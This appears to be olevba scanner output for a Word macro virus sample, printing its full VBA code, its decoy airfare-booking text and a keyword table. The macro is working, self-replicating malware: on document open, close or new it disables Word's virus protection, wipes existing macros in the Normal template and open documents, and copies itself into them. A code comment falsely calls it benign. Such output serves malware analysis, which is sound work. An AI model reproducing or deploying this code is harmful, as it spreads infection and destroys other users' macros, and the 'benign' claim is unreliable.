olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-1487b2adc09b657b19406a7be12f2423e90f4727
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-1487b2adc09b657b19406a7be12f2423e90f4727 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub









































































                                                      Many discount fares require that you make a reservation
                                                      7, 14 or 21 days before your trip depending on the fare.
                                                      The best international fares often require a reservation 30
                                                      days in advance. Airlines sell only a limited number of
                                                      seats at the lowest fares. When those seats sell out, the
                                                      price goes up. Making a reservation as soon as you know
                                                      your travel dates increases your chances of finding a fare
                                                      you can live with.
                                                      Fly on a weekday
                                                      Flights on Tuesday, Wednesday and Thursday usually
                                                      offer the lowest fares. Fares are sometimes (but not
                                                      always) higher on Monday and Friday than on other
                                                      weekdays. Saturday flights occasionally have discount
                                                      fares, but as a rule it's more expensive to fly on a weekend
                                                      than a weekday.
                                                      Most low fares require that you stay over at least one
                                                      Saturday night before your return flight. However, some
                                                      fares may only require you to stay a minimum of 3 or 4
                                                      days.
                                                      It 's almost always less expensive to use only one airline for
                                                      a trip instead of two. Booking two airlines can, in some
                                                      cases, cost hundreds of dollars more.
                                                      If you don't at first succeed, try an earlier or later flight. To
                                                      get the lowest roundtrip fare, that fare must be available on
                                                      both the departing and return flights you select. If the fare
                                                      is sold out on either of these, the price you end up with will
                                                      be much higher. Try an earlier or later flight if you can't
                                                      find the fare you want; or, if possible, consider flying on
                                                      another day.




`







































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

